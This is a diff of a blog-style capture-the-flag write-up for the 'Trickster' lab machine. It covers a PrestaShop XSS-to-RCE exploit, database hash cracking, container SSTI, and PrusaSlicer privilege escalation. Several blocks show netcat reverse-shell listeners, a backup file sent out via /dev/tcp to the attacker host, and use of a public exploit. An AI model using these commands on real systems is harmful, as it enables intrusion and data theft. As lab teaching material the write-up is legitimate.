@@ -11,14 +11,15 @@ image:
 ---
 ## Box Info
 
-Freelancer starts off by abusing the relationship between two Django websites, followed by abusing an insecure direct object reference in a QRcode login to get admin access. From there, I’ll use impersonation in the MSSQL database to run commands as the sa account, enabling xp_cmdshell and getting execution. I’ll find MSSQL passwords to pivot to the next user. This user has a memory dump which I’ll analyze with MemProcFS to find another password in LSA Secrets. Bloodhound shows this user is in a group with GenericWrite privileges over the DC, which I’ll abuse with resource-based constrained delegation to get domain hashes and a shell as administrator. In Beyond Root, I’ll show an altnerative path using WinDbg to on the dump to find another password, and spraying variations of it to get passwords for a bunch of users, some of whom are also in the group with privileges necessary to exploit the DC 
+Trickster starts off by discovering a subdoming which uses PrestaShop. Dumping a leaked .git folder gives source code and admin panel is found. Chaining XSS and Theme Upload, www-data user is reached. A docker is found inside the box which hosts a Changedetection.io. Abusing SSTI, we are root inside the docker. Credentials can be found on .history which can be used to login as root on the box. The root path got changed a few weeks after box got released. The fixed path goes on like this. We won't find credentials on .history but there is a datastore directory which has 2 backup files. Opening one of the files gives us a .txt.br file which gives credentials to adam user. Adam user can use pursaslicer as root without password. Malicous scripts can be executed with prusaslicer after a .3mf file is sliced and get shell as root. 
 
 ## Recon
 ### nmap
 
 Nmap finds only ports `22` and `80` open.
-```text
-$ nmap -sVC -p- 10.129.215.104
+```console
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
+└──╼ $ nmap -sVC -p- 10.129.215.104
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 17:15 +03
 Nmap scan report for 10.129.215.104
 Host is up (0.044s latency).
@@ -74,8 +75,9 @@ Searching for public exploits for `PrestaShop`. Only found sql injection and mod
 While enumerating the page, ran ffuf in the background. Ffuf got only 1 hit which is `.git`. Using `git-dumper`, we can dump the .git folder of website and 
 see the logs and previous commits on the repo.
 
-```text
-──╼ $ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://shop.trickster.htb/FUZZ -fs 283
+```console
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
+└──╼ $ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://shop.trickster.htb/FUZZ -fs 283
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -101,8 +103,9 @@ ________________________________________________
 .git                    [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 69ms]
 ```
 Might take a while beacuse folder is large.
-```text
-──╼ $ ./git-dumper-linux http://shop.trickster.htb/.git/
+```console
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
+└──╼ $ ./git-dumper-linux http://shop.trickster.htb/.git/
 Downloaded 'info/exclude' (240 bytes)
 	Not using file 'info/exclude' for anything right now
 Downloaded 'logs/HEAD' (163 bytes)
@@ -124,8 +127,10 @@ Downloaded 'objects/c7/1623070c5c6d7212c4d645a043646e1dd48675' (1143 bytes)
 	Found blob object
 ```
 Cd into `git-dumped`, using `git log` shows us previous commits. Using `git show 0cbc7831c1104f1fb0948ba46f75f1666e18e64c` renders the changes.
-```text
+```console
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
 └──╼ $ cd git-dumped/.git/
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/git-dumped/.git]
 └──╼ $ ls -la
 total 26496
 drwxr-xr-x 1 suce suce      134 Eki 12 19:45 .
@@ -141,6 +146,7 @@ drwxr-xr-x 1 suce suce        8 Eki 12 19:40 logs
 drwxr-xr-x 1 suce suce     1020 Eki 12 19:40 objects
 drwxr-xr-x 1 suce suce       10 Eki 12 19:40 refs
 
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickste/git-dumped/.git]
 └──╼ $ git log
 commit 0cbc7831c1104f1fb0948ba46f75f1666e18e64c (HEAD -> admin_panel)
 Author: adam <adam@trickster.htb>
@@ -148,6 +154,7 @@ Date:   Fri May 24 04:13:19 2024 -0400
 
     update admin pannel
 
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/git-dumped/.git]
 └──╼ $ git show 0cbc7831c1104f1fb0948ba46f75f1666e18e64c
 ```
 Reading a few lines on the code and `/admin634ewutrx1jgitlooaj/` looks like the admin directory.
@@ -172,12 +179,13 @@ Entering `http://shop.trickster.htb/admin634ewutrx1jgitlooaj/` gives the admin l
 
 ### CVE-2024-34716
 
-There is a XSS vuln on PrestaShop 8.1.5 by creating a malicious PNG file which executes js code and steals the cookies who viewed the file, attacker can use the stolen cookies to upload a malicious .zip and download theme which results with remote-code execution. There is a public POC available by the founder of the vuln.
+There is a XSS vulnerability on PrestaShop 8.1.5 by creating a malicious PNG file which executes js code and steals the cookies from who viewed the file, attacker can use the stolen cookies to upload a malicious .zip and download theme which results with remote-code execution. There is a public POC available by the founder of the vulnerability.
 This is also updated version of the original POC which was kinda messy. To learn more about the exploit, read this [**blog**](https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/) .
 
 Use `git clone https://github.com/aelmokhtar/CVE-2024-34716` and run `exploit.py`. 
 
-```text
+```console
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
 └──╼ $ nc -lvnp 12345
 listening on [any] 12345 ...
 connect to [10.10.14.145] from (UNKNOWN) [10.129.136.211] 51484
@@ -204,7 +212,7 @@ www-data@trickster:/$
 
 Trying to find database file on prestashop directory. Viewing a few files, we can find the following.
 
-```text
+```console
 www-data@trickster:~/prestashop/config$ cat config.inc.php
 .
 .
@@ -235,7 +243,7 @@ Got db creds on `/app/config/parameters.php`. `(Password is not shown)`
     'mailer_user' => NULL,    
 ```
 Logging into database.
-```text
+```console
 www-data@trickster:~/prestashop/app/config$ mysql -u ps_user -p
 mysql -u ps_user -p
 Enter password:
@@ -259,15 +267,16 @@ show tables;
 +-------------------------------------------------+
 276 rows in set (0.001 sec)
 
-MariaDB [prestashop]> select * from ps_customer;
+MariaDB [prestashop]> select * from ps_employee;
 select * from ps_employee;
 ```
 Dumping `ps_employee` gives hashes for `admin@trickster.htb` and `james@trickster.htb`.
 
 `Hashcat` cracks one of the hashes and got a password. `(Password is not shown)`
 
-```text
-──╼ $ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 
+```console
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
+└──╼ $ hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 
 hashcat (v6.2.6) starting
 
 OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
@@ -301,7 +310,7 @@ $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/*********:al**************
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
-Hash.Target......: $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6y...yunCmm
+Hash.Target......: $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/*********
 Time.Started.....: Mon Oct 14 21:08:34 2024 (17 secs)
 Time.Estimated...: Mon Oct 14 21:08:51 2024 (0 secs)
 Kernel.Feature...: Pure Kernel
@@ -319,12 +328,13 @@ Hardware.Mon.#1..: Util: 82%
 ```
 
 Trying the password on `james` user and logs us in. User flag can be found in `user.txt`.
-```text
+```console
 www-data@trickster:/home$ ls
 ls
 adam  james  runner
 ```
-```text
+```console
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
 └──╼ $ ssh james@trickster.htb
 james@trickster.htb's password: 
 Last login: Thu Sep 26 11:13:01 2024 from 10.10.14.41
@@ -337,7 +347,7 @@ james@trickster:~$
 
 `Sudo -l` doesn't give us anything. Checking open ports, also nothing new or useful.
 
-```text
+```console
 james@trickster:~$ sudo -l
 [sudo] password for james: 
 Sorry, try again.
@@ -355,7 +365,7 @@ LISTEN                0                     128                                 
 ### Docker Enum
 
 Checking both `ps aux` and `ifconfig` says there is a docker running.
-```text
+```console
 james@trickster:~$ ifconfig
 docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
@@ -365,7 +375,7 @@ docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         TX packets 9  bytes 378 (378.0 B)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
-```text        
+```console       
 james@trickster:~$ ps aux | grep container
 root        1277  0.1  1.1 1800788 47388 ?       Ssl  16:52   0:11 /usr/bin/containerd
 root        1356  0.0  1.9 1977936 76632 ?       Ssl  16:52   0:01 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
@@ -374,22 +384,22 @@ james      11982  0.0  0.0   7008  2044 pts/2    R+   18:35   0:00 grep --color=
 ```
 Using this simple `ping sweep`, IP is found as `172.17.0.2`.
 
-```text 
+```console 
 james@trickster:~$ for ip in {1..16}; do ping -c 1 -W 1 172.17.0.$ip &> /dev/null && echo "172.17.0.$ip is up"; done
 172.17.0.1 is up
 172.17.0.2 is up
 james@trickster:~$
 ```
 After finding the IP, checking the open ports. Noticed i can use `netcat` to find open ports. Using this command found online, we find the only port open is `5000`.
-```text 
+```console 
 james@trickster:~$ for port in {1..9999}; do nc -zv -w 1 172.17.0.2 $port 2>&1 | grep succeeded; done
 Connection to 172.17.0.2 5000 port [tcp/*] succeeded!
-james@trickster:~
+james@trickster:~$
 ```
 
 Downloading `nmap` binary from my host and searching also achieves the same thing.
 
-```text
+```console
 james@trickster:~$ wget 10.10.14.145:8000/nmap
 --2024-10-14 18:40:28--  http://10.10.14.145:8000/nmap
 Connecting to 10.10.14.145:8000... connected.
@@ -415,7 +425,7 @@ Nmap done: 1 IP address (1 host up) scanned in 36.69 seconds
 ```
 `Forwarding` the port to my host to login using `firefox`.
 
-```text
+```console
 ┌─[suce@parrot]─[~]
 └──╼ $ ssh -L 5000:172.17.0.2:5000 james@trickster.htb
 james@trickster.htb's password: 
@@ -448,7 +458,7 @@ This box actually got fixed after a few weeks because finding `root pass` on a h
 
 Literally nothing except this `datastore` folder.
 
-```text
+```console
 root@a4b9a36ae7ff:/app# ls /
 ls /
 app  boot	dev  home  lib64  mnt  proc  run   srv	tmp  var
@@ -469,19 +479,19 @@ changedetection-backup-20240830202524.zip
 
 Found 2 backup folders. Using `/dev/tcp/ip/port`, i can send the zip to my host and listen with `nc` and extract it.
 
-```text
-┌─[✗]─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
+```console
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
 └──╼ $ nc -l -p 9999 -q 1 > changedetection-backup-20240830194841.zip
-```text
+```
 
-```text
+```console
 root@a4b9a36ae7ff:/datastore/Backups# cat changedetection-backup-20240830194841.zip > /dev/tcp/10.10.14.145/9999
 <kup-20240830194841.zip > /dev/tcp/10.10.14.145/9999
 ```
 Viewing the .zip file.
 
-```text
-┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/root]
+```console
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
 └──╼ $ unzip changedetection-backup-20240830194841.zip 
 Archive:  changedetection-backup-20240830194841.zip
    creating: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/
@@ -491,15 +501,15 @@ Archive:  changedetection-backup-20240830194841.zip
   inflating: url-list.txt            
   inflating: url-list-with-tags.txt  
   inflating: url-watches.json        
-┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/root]
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
 └──╼ $ ls
 b4a8b52d-651b-44bc-bbc6-f9e8c6590103       url-list.txt
 changedetection-backup-20240830194841.zip  url-list-with-tags.txt
 changedetection-backup-20240830202524.zip  url-watches.json
 secret.txt
-┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/root]
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
 └──╼ $ cd b4a8b52d-651b-44bc-bbc6-f9e8c6590103/
-┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/root/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
 └──╼ $ ls
 f04f0732f120c0cc84a993ad99decb2c.txt.br  history.txt
 ```
@@ -508,8 +518,8 @@ Found a compressed .txt file. Searching the web says it's `brotli`.
 ![brotli](/assets/img/htb/trickster.htb/brotli.png){: width="800" height="500" }
 
 Decompressing with `brotli` and viewing file gives us creds for `adam` user. `(Password not shown)`
-```text
-┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/root/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
+```console
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
 └──╼ $ sudo apt install brotli
 Reading package lists... Done
 Building dependency tree... Done
@@ -517,14 +527,14 @@ Reading state information... Done
 .
 .
 .
-┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/root/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
 └──╼ $ brotli -d f04f0732f120c0cc84a993ad99decb2c.txt.br 
-┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/root/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
 └──╼ $ ls
 f04f0732f120c0cc84a993ad99decb2c.txt  f04f0732f120c0cc84a993ad99decb2c.txt.br  history.txt
 ```
-```text
-┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/root/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
+```console
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
 └──╼ $ cat f04f0732f120c0cc84a993ad99decb2c.txt
   This website requires JavaScript.
     Explore Help
@@ -550,8 +560,8 @@ f04f0732f120c0cc84a993ad99decb2c.txt  f04f0732f120c0cc84a993ad99decb2c.txt.br  h
 
 SSH to `adam` using the password. Using `sudo -l`, we can use `prusaslicer` as `root` without password.
 
-```text
-┌─[suce@parrot]─[~]
+```console
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster]
 └──╼ $ ssh adam@trickster.htb
 adam@trickster.htb's password: 
 adam@trickster:~$ sudo -l
@@ -573,7 +583,7 @@ When i pwned the box for the first time (not fixed), i made a eaiser `prusaslice
 Do everything [**here**](https://github.com/suce0155/prusaslicer_exploit/blob/main/README.md) or below and you will get shell as `root`.
 
 
-```text
+```console
 adam@trickster:~$ ls
 evil.3mf  exploit.sh
 adam@trickster:~$ mv exploit.sh /tmp
@@ -592,8 +602,8 @@ print warning: Detected print stability issues:
 EXPLOIT
 ```
 
-```text
-┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/root/b4a8b52d-651b-44bc-bbc6-f9e8c6590103/prusaslicer_exploit]
+```console
+┌─[suce@parrot]─[~/Desktop/htbMachines/medium-trickster/b4a8b52d-651b-44bc-bbc6-f9e8c6590103/prusaslicer_exploit]
 └──╼ $ nc -lvnp 9999
 listening on [any] 9999 ...
 connect to [10.10.14.145] from (UNKNOWN) [10.129.136.125] 52202
